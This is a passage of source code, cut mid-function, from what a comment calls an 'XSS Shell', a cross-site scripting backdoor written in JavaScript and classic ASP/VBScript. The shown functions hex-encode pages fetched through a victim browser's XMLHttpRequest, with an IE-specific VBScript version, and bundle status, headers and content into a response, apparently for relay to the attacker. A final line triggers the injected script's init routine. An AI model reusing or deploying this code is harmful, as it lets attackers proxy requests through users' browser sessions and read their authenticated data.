			if (curVal>0xFF){
				hex = hex.substring(2,4);

			}else if(curVal<0x10){
				hex = "0" + hex;
				
			}
			
			output = output + hex;
		}

	}catch (e){
		debug("Binary encoding failed" + e);

	}

	return output;
}

/*

	Build response from XHR object
	<status> <status text>\n<headers>\n\n<BinaryEncodedContent>
	08.04.2007

*/
function buildResponse(xhr){
	var status = xhr.status;
	var statusText = xhr.statusText;
	var headers = xhr.getAllResponseHeaders()
	var content;
	
	content = (ie)?ieBinary(xhr):binEncode(xhr.responseText);

	var ret = status + " " + statusText + "\n" + headers + "\n\n" + content;
	return ret
}

<%
	'ASP HELPER FUNCTIONS
	Function fm_QNStr(byVal Qstring)
		Qstring = Trim(Request.Querystring(Qstring))
		If NOT IsNumeric(Qstring) Then fm_QNStr = DefaultID Else fm_QNStr = Qstring
	End Function

	Function fm_RndNumeric()
		Randomize Timer
		fm_RndNumeric = CLng((Rnd*666139))+1
	End Function


	
	'XSS Shell IE Binary Encode Implementation (should work IE6,IE7 and maybe IE5 as well)
	Function LoadVB()
%>
		Function ieBinary(xhr)
			Dim content, ret, i
			content = xhr.responseBody
			ret = ""

			Dim hc, cret
			For i = 1 To LenB(content)
				hc = AscB(MidB(content,i,1))
				cret = Hex(hc)
				
				If hc < &H10 Then cret = "0" & cret
				
				ret = ret & cret
			Next

			ieBinary = ret
		End Function
<%

	End Function

%>
if(!d.loadXSS){init()}
	